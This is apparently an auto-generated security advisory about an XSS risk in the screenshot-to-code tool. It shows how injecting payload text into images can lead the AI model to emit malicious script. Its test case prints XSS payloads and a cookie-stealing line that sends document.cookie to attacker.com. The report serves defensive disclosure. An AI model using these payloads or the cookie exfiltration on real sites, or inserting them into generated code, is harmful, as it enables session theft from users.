### Merged Vulnerability List

This document outlines the identified Cross-Site Scripting (XSS) vulnerability present in the screenshot-to-code project. The vulnerability stems from the application's reliance on AI models to generate code without proper sanitization, leading to the potential injection and execution of malicious JavaScript within the generated code.

#### Vulnerability Name: Cross-Site Scripting (XSS) in AI-Generated Code

- **Description:**
    1. An attacker crafts a malicious input, such as an image containing embedded JavaScript code or text that can be misinterpreted as JavaScript, and uploads it to the `screenshot-to-code` application through the frontend.
    2. The application's backend receives this input and utilizes an AI model (like Claude or GPT) to generate HTML, CSS, and JavaScript code based on the provided image.
    3. Due to the nature of AI-generated content and the lack of security considerations in the generation process, the AI model may inadvertently or intentionally include malicious JavaScript code within the generated output. This could be through direct injection from the input or due to the AI model's interpretation of malicious text or patterns in the input image.
    4. The `screenshot-to-code` application backend, specifically in `backend/routes/generate_code.py`, directly streams this AI-generated code back to the frontend via WebSocket without any form of security sanitization or content inspection.
    5. The frontend receives this unsanitized HTML code and dynamically renders it within the user's browser, executing any embedded JavaScript code.
    6. Consequently, when a user deploys this AI-generated code to a web server without prior security review, and other users access the deployed web application, the malicious JavaScript code embedded within the AI-generated content executes in their browsers, leading to Cross-Site Scripting (XSS). This allows the attacker to execute arbitrary JavaScript code in the context of the victim's browser session.

- **Impact:**
    - **Account Takeover:** By stealing session cookies or other authentication tokens through JavaScript, attackers can hijack user accounts and gain unauthorized access.
    - **Website Defacement:** Attackers can modify the content of the web page displayed to users, potentially damaging the website's reputation or spreading misinformation.
    - **Redirection to Malicious Sites:** Users can be silently redirected to attacker-controlled websites, which can be used for phishing attacks, malware distribution, or further exploitation.
    - **Data Theft:** Attackers can steal sensitive information accessible through the user's browser session, including personal data, API keys, or other confidential information stored in local storage or cookies.
    - **Malware Distribution:** The XSS vulnerability can be leveraged to distribute malware to users visiting the compromised website, infecting their systems.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:**
    - None. The current implementation of the `screenshot-to-code` project prioritizes functionality and the accuracy of code generation over the security of the generated code. There are no automated security mechanisms in place to sanitize or inspect the AI-generated code before it is presented to the user or deployed. While documentation might implicitly suggest user review, there are no active mitigations within the application itself.

- **Missing Mitigations:**
    - **Output Sanitization (Backend-side):**  It is crucial to implement server-side sanitization of the AI-generated code before it is sent to the frontend. This should involve parsing the generated HTML, CSS, and JavaScript on the backend and using a robust HTML sanitization library (like Bleach in Python) to remove or escape potentially dangerous elements and attributes. This will prevent the execution of malicious JavaScript injected by the AI model.
    - **Content Security Policy (CSP) Recommendation:** The application should recommend, or ideally automatically include, a Content Security Policy (CSP) in the header of the generated HTML. CSP is a browser security mechanism that can significantly mitigate XSS attacks by controlling the resources (scripts, styles, etc.) that the browser is allowed to load. Clear instructions on how to configure CSP for deployed applications should be provided in the documentation, or ideally, the application should offer a feature to generate a secure CSP configuration.
    - **Security Warning:** A clear and prominent warning message should be displayed in the application's frontend whenever code is generated. This warning must explicitly communicate the potential security risks associated with deploying AI-generated code without a thorough security review. Users should be strongly advised to manually inspect and conduct security testing of the generated code before deploying it to a live environment.

- **Preconditions:**
    1. A user must utilize the `screenshot-to-code` application to generate web application code.
    2. The AI model used by the application must generate code that inadvertently or intentionally includes malicious JavaScript. This can be triggered through malicious input images, prompt injection, or inherent limitations of the AI model in producing secure code.
    3. The user must deploy the AI-generated code to a publicly accessible web server without performing a thorough security review and sanitization of the code.
    4. End-users must access the deployed web application through their browsers for the XSS vulnerability to be exploited.

- **Source Code Analysis:**
    - **`backend/routes/generate_code.py`:** This file serves as the entry point for code generation requests via the `/generate-code` WebSocket endpoint. The `stream_code` function handles the entire code generation process. It receives user input, interacts with AI models via functions in `llm.py`, and streams the generated code back to the frontend. Critically, no sanitization is performed on the AI-generated code within this file or in any part of the backend before sending it to the frontend. The code directly forwards the raw, potentially malicious, AI-generated HTML.
    - **`backend/codegen/utils.py`:** The `extract_html_content` function is used to parse and extract HTML from the AI model's response. However, this function is purely for content extraction and does not perform any security sanitization. It focuses on extracting the HTML structure and content, but not on removing or escaping potentially malicious JavaScript or HTML attributes.
    - **`frontend`:** The frontend, upon receiving the AI-generated code via WebSocket, directly displays it to the user.  There is no client-side sanitization implemented in the frontend either. The frontend trusts the backend and renders the received HTML as is.

    ```

- **Security Test Case:**
    1. **Environment Setup:** Deploy a local instance of the `screenshot-to-code` project according to the instructions in the `README.md`. Ensure both frontend and backend are running.
    2. **Malicious Input Preparation:** Create a PNG image that visually resembles a webpage but includes a malicious JavaScript payload as text. For example, embed the text `<img src=x onerror=alert('XSS')>` or `<script>alert('XSS')</script>` within the image's content using an image editor. Alternatively, find an image online or create a design mockup that incorporates such text subtly.
    3. **Code Generation:** Open the `screenshot-to-code` application in a web browser (e.g., `http://localhost:5173`). Upload the prepared malicious image through the application's interface. Select any supported stack (e.g., HTML + Tailwind) and initiate the code generation process.
    4. **Generated Code Inspection:** Once code generation is complete, carefully examine the generated HTML code displayed in the frontend's output area. Look for the injected malicious JavaScript code, especially within `<script>` tags or event handler attributes (e.g., `onerror`, `onload`). Verify if the payload from your malicious image, or a variation of it, is present in the generated code.
    5. **Deployment of Vulnerable Code:** Copy the generated HTML code from the frontend. Create a new HTML file (e.g., `xss_test.html`) and paste the copied code into it. Host this `xss_test.html` file on a simple HTTP server. You can use Python's `http.server` for local testing or any other web server.
    6. **XSS Trigger and Verification:** Open `xss_test.html` in a web browser. If the generated code is vulnerable to XSS, the embedded JavaScript code should execute. For payloads like `<img src=x onerror=alert('XSS')>`, an alert box displaying 'XSS' should appear. If you used `<script>alert('XSS')</script>`, the alert should also pop up.
    7. **Exploit Confirmation and Further Assessment:** Successful execution of the JavaScript code confirms the presence of the XSS vulnerability. To further assess the impact, you can replace the simple `alert('XSS')` payload with more sophisticated XSS payloads designed to steal cookies (e.g., `document.location='http://attacker.com/cookie_stealer?cookie='+document.cookie`) or redirect to an attacker-controlled website, and repeat steps 5 and 6 to verify those more critical impacts.
